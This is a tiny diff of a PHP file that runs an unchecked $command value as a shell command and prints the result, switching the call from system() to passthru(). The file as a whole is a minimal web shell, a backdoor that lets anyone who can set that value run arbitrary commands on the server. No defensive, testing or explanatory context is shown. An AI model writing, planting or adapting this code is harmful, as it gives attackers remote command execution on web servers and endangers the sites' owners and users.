@@ -1,5 +1,5 @@
 <?php 
 if($command) {
-echo system($command);
+echo passthru($command);
 }
 ?>
